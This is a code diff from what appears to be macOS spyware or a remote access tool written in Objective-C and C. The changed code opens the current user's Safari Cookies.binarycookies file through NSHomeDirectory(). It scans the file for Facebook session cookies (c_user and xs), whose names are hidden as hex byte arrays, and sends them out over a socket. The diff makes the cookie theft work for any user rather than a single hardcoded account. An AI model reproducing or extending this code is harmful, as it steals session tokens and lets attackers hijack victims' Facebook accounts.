@@ -33,7 +33,8 @@ char lastBytes[64];
 
     
 char* parseBinary(int* searchChars,int sizeOfSearch) {
-    cookieJar = fopen("/Users/lucasjackson/Library/Cookies/Cookies.binarycookies", "rb+");
+    NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
+    cookieJar = fopen([cookieJarPath UTF8String], "rb+");
     fseek(cookieJar, 0L, SEEK_END);
     long cookieJarSize = ftell(cookieJar);
     int pos = 0; int curSearch = 0;int curChar;
@@ -602,17 +603,18 @@ int sockfd;
     [self sendString:[NSString stringWithFormat:@"%d",processID]];
 }
 
+    
 -(void)getFacebook {
     NSString *result = @"";
-    int cuserArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
+    int fb_cuser[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
         0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x63, 0x5f, 0x75,
         0x73, 0x65, 0x72, 0x00, 0x2f, 0x00}; //facebook.com c_user /
-    result = [NSString stringWithFormat:@"c_user = %s\n",parseBinary(cuserArr,22)];
+    result = [NSString stringWithFormat:@"c_user = %s\n",parseBinary(fb_cuser,22)];
 
-    int tokenArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
+    int fb_xs[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
         0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
         0x2f, 0x00}; //facebook.com xs /
-    result = [NSString stringWithFormat:@"%@xs = %s",result,parseBinary(tokenArr,18)];
+    result = [NSString stringWithFormat:@"%@xs = %s\n\n",result,parseBinary(fb_xs,18)];
 
     [self sendString:result];
 }
